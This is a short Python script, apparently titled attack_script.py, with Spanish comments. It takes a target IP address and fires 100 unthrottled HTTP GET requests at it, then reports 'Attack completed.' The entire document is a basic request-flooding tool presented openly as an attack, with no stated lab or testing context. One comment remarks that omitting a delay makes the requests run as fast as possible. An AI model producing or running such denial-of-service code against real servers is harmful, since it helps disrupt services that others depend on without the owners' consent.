import sys
import requests

if len(sys.argv) != 2:
    print("Usage: python attack_script.py <target_ip>")
    sys.exit(1)

target_ip = sys.argv[1]
url = f"http://{target_ip}"

# Definir el número de veces que se ejecutará el ataque
num_requests = 100

for i in range(num_requests):
    try:
        response = requests.get(url)
        print(f"Requested {url} - Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error requesting {url}: {e}")

    # No se necesita tiempo de espera si queremos ejecutar las solicitudes lo más rápido posible
    # En un escenario real, podrías considerar agregar una pausa para no sobrecargar el servidor objetivo

print("Attack completed.")

